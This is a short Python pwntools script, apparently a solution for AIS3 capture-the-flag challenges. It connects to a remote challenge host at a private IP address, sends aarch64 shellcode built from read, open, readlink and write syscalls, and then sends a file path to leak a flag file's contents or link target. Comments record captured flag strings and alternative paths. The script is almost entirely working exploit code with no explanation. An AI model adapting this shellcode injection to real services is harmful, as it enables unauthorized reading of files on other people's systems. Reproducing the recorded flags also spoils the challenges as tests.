#!/usr/bin/env python
from pwn import *

context.arch = 'aarch64'

# ais3{arm64_shellcode_IS_NOT_difficult_for_U}

host , port = '10.13.2.44' , 10732
y = remote( host , port )

# ais3{he11o, (fr0m a diff3r3nt) w0r1d!}
# ais3{Good Job! ... but you have to read the link. See readlink!}

'''
p = asm( shellcraft.read( 0 , 'sp' , 0x70 ) )
p += asm( shellcraft.open( 'sp' , 0 , 0) )
p += asm( shellcraft.read( 'x0' , 'sp' , 0x70 ) )
p += asm( shellcraft.write( 1 , 'sp' , 0x70 ) )
'''

p = asm( shellcraft.read( 0 , 'sp' , 0x70 ) )
p += asm( shellcraft.open( 'sp' , 0 , 0) )
#p += asm( shellcraft.read( 'x0' , 'sp' , 0x370 ) )
p += asm( shellcraft.syscall( 'SYS_readlink' , 'sp' , 'sp' , 0x370 ) )
p += asm( shellcraft.write( 1 , 'sp' , 0x370 ) )

#p = asm( shellcraft.cat( '/usr/lib/python3.5/flag_leaker/__init__.py' , 1 ) )

y.send(p)

y.send('/home/crypto2/fl4g\x00')
#y.send('/home/crypto2/\x00')
#y.send('/home/readlink/flag\x00')

y.interactive()

